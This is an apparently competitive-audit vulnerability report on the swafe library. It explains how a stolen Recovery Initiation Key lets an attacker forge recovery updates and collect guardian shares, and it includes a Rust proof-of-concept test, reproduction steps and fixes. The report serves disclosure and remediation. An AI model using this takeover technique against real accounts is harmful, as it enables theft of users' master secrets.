# Stolen RIK Forges Recovery Updates

## Link to Affected File(s)
- https://github.com/code-423n4/2025-11-swafe/blob/main/lib/src/account/v0.rs

## Severity
High

## Vulnerability Details
`AccountStateV0::initiate_recovery` accepts any Recovery Initiation Key (RIK) plus the public account state and deterministically produces a signed recovery update (`AccountMessageV0::Recovery`) using the signing key embedded in the association ciphertext. The function never checks that the caller still owns the account or presents fresh proof beyond possession of the RIK. Consequently, anyone who ever intercepts a single RIK (for example by compromising an off-chain association node) can unilaterally forge a recovery update that replaces the owner’s recovery public key with one controlled by the attacker. Guardians trust those updates and will re-encrypt their shares to the forged key, giving the attacker the raw material to reconstruct the master secret.

## Expected Behavior
Initiating recovery should require a live attestation from the account owner (or a quorum of guardians) in addition to the RIK. Even if the RIK leaks, an attacker should not be able to mint recovery updates unless they can authenticate as the owner or prove recency, preventing indefinite replay.

## Affected Files and Line Number Ranges
* lib/src/account/v0.rs: lines 171–226

## Attack Preconditions
* The attacker captured a legitimate Recovery Initiation Key at any point in the past.
* The account has configured guardians and published the normal allocation so that recovery updates are meaningful.
* Guardians continue to honor recovery updates that pass signature verification but do not distinguish between original owners and replayed RIK holders.

## Exploitation Path
1. During any association setup, steal or log the emitted RIK (e.g., from a compromised off-chain service or through logging).
2. Using only that RIK and public account data, call `AccountStateV0::initiate_recovery` to decrypt the association, mint a new recovery encryption key, and sign a recovery update with the embedded signing key.
3. Submit the forged update to the contract; it passes verification because the signature is valid for the association.
4. Guardians execute `check_for_recovery`, see the valid update, and encrypt their shares to the attacker-provided recovery key, enabling a full takeover once enough shares are collected.

## Proof of Concept (PoC)
```rust
use rand::SeedableRng;
use rand_chacha::ChaCha20Rng;
use serde_json::Value;
use swafe_lib::account::AccountSecrets;

/// Threat Component #2 (account lifecycle & recovery): possession of a single Recovery
/// Initiation Key (RIK) is enough to craft and submit a recovery update without any
/// account-owner authentication. Guardians will honor the forged recovery request and
/// re-encrypt their shares to the attacker-provided recovery key.
#[test]
fn stolen_rik_allows_unilateral_recovery_tc2() {
    let mut rng = ChaCha20Rng::from_seed([7u8; 32]);

    // Owner and guardians generate their secrets and initial public states.
    println!("[setup] Generating owner and guardian key material");
    let owner_secrets = AccountSecrets::gen(&mut rng).expect("failed to generate account secrets");
    let guardian1 = AccountSecrets::gen(&mut rng).expect("guardian1 generation failed");
    let guardian2 = AccountSecrets::gen(&mut rng).expect("guardian2 generation failed");

    println!("[setup] Building guardian public states (allocation updates)");
    let guardian_state1 = guardian1
        .update(&mut rng)
        .expect("guardian1 update")
        .verify(None)
        .expect("guardian1 allocation verify");
    let guardian_state2 = guardian2
        .update(&mut rng)
        .expect("guardian2 update")
        .verify(None)
        .expect("guardian2 allocation verify");
    let guardians = [guardian_state1, guardian_state2];

    // Owner publishes the initial allocation (version 0).
    println!("[owner] Publishing allocation update (st0)");
    let allocation_update = owner_secrets
        .update(&mut rng)
        .expect("failed to build allocation update");
    let account_id = *owner_secrets.acc();
    let st0 = allocation_update
        .verify(None)
        .expect("allocation verify should succeed");

    // Owner configures recovery and a fresh association, yielding a RIK that the attacker later steals.
    println!("[owner] Configuring guardians/threshold and deriving a Recovery Initiation Key (RIK)");
    let mut owner_live = st0
        .decrypt(owner_secrets.msk(), account_id)
        .expect("failed to decrypt account secrets");
    owner_live
        .update_recovery(&mut rng, &guardians, 2)
        .expect("failed to configure guardians/threshold");
    let stolen_rik = owner_live
        .add_association(&mut rng)
        .expect("failed to add association and derive RIK");
    println!("[attacker] RIK stolen: proceeding to forge a recovery update");
    let recovery_setup_update = owner_live
        .update(&mut rng)
        .expect("failed to build recovery-setup update");
    let st1 = recovery_setup_update
        .verify(Some(&st0))
        .expect("recovery setup verify should succeed");

    // Attacker holding only the RIK (no owner secrets) forges a recovery update that the contract accepts.
    println!("[attacker] Forging recovery update using only stolen RIK and public account state");
    let (forged_recovery_update, _forged_recovery_secrets) = st1
        .initiate_recovery(&mut rng, account_id, &stolen_rik)
        .expect("failed to initiate recovery with stolen RIK");
    let st_recovery = forged_recovery_update
        .verify(Some(&st1))
        .expect("forged recovery should be accepted");

    // Guardian responds to the forged recovery request and re-encrypts their share to the attacker's key.
    println!("[guardian] Responding to forged recovery; re-encrypting share to attacker");
    let forged_share = guardian1
        .check_for_recovery(&mut rng, account_id, &st_recovery)
        .expect("guardian recovery processing failed")
        .expect("guardian should emit a share for the forged request");

    // Ensure the guardian share is non-empty, proving the guardian honored the forged recovery update.
    println!("[assert] Guardian returned a share, proving forged recovery was honored");
    let forged_json: Value = serde_json::to_value(&forged_share).expect("serializable share");
    assert!(
        forged_json.to_string().len() > 2,
        "guardian returned a concrete share in response to the forged recovery update"
    );
}
```

## Repository Layout Requirements
Ensure the repository mirrors the expected layout before running the PoC:

1. Create a top-level `security-poc/` directory (if it does not already exist) at the root of the repository.
2. Initialize that directory as its own Cargo crate by adding a `Cargo.toml` that declares the `security-poc` package and points to the local `swafe-lib` path dependency, mirroring the structure used during validation.
3. Inside `security-poc/`, create a `tests/` folder and place the PoC file (`tc2_replayable_recovery_update.rs`) there so that Cargo can discover it via `cargo test -p security-poc --test ...`.

## Steps to Reproduce Locally
1. From the repo root, run `cargo test -p security-poc --test tc2_replayable_recovery_update -- --nocapture`.
2. The deterministic RNG seed ensures the owner, guardians, and attacker produce the same key material on every run.
3. Inspect the `[guardian]` and `[assert]` logs to confirm that a guardian emits a recovery share even though only the stolen RIK was provided.

## Recommended Fixes
* Bind recovery updates to an authenticated session: require a fresh EmailCert or owner signature in addition to the RIK before accepting `AccountMessageV0::Recovery`.
* Store monotonically increasing recovery nonces or version counters so replayed or stale RIKs are rejected once used.
* Consider deriving short-lived RIK capabilities tied to time-bound tokens, forcing an attacker to compromise the owner and the live session simultaneously rather than reusing an old RIK indefinitely.

## Reviewer Notes (Optional)
The embedded PoC is the accepted regression test summarized in `reviews-poc/tc2_replayable_recovery_update.md`, which confirms the setup uses real `swafe_lib` APIs and deterministically demonstrates unilateral recovery with only a stolen RIK.
